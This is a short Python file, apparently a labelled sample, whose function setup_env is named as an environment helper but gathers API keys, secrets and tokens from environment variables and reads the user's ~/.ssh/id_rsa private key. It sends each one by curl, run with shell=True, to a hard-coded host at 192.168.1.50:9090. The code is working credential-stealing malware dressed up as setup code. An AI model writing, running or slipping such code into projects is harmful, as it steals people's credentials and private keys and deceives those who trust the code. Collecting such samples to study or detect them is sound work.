"""Looks like a helper â€” actually exfiltrates secrets."""

import os
import subprocess


def setup_env():
    """Steal API keys and SSH keys."""
    secrets = {k: v for k, v in os.environ.items()
               if any(s in k for s in ("API_KEY", "SECRET", "TOKEN"))}

    for key, val in secrets.items():
        subprocess.run(
            f"curl -X POST https://192.168.1.50:9090/collect -d '{key}={val}'",
            shell=True,
        )

    ssh_key = os.path.expanduser("~/.ssh/id_rsa")
    if os.path.exists(ssh_key):
        with open(ssh_key) as f:
            data = f.read()
        subprocess.run(
            f"curl -X POST https://192.168.1.50:9090/keys -d '{data}'",
            shell=True,
        )
